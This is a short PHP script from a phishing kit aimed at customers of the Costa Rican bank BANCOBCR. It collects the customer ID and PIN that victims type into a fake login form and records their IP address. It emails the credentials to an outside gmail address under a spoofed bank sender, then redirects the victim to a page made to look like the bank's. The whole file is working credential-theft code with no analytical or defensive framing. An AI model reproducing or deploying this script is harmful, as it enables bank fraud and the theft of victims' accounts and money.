<?

$message .= "---------------------ARRIBA BANCOBCR------------------------------\n<br>";
$message .= "Identificacion: ".$_POST['CustomerID']."\n<br>";
$message .= "Contrasena: ".$_POST['PIN']."\n<br>";
$ipv=getenv("REMOTE_ADDR");
$message .= "-------------------------------------------------------------------\n<br>";
$subj = "ACCESOS BANCOBCR - $ipv";
$id= base64_encode("Identificacion :".$_POST['CustomerID']."Contrasena :".$_POST['PIN']);

if(!mail("equipo13111@gmail.com", $subj , $message, "From: BANCO BANCOBCR\nContent-Type: text/html; charset=iso-8859-1")) {
 header("location: registroclavenetpersonal/inc/bv_topeizquierdoPanel.asp.php");
} else {
header("location: registroclavenetpersonal/inc/bv_topeizquierdoPanel.asp.php");
}
 
?>
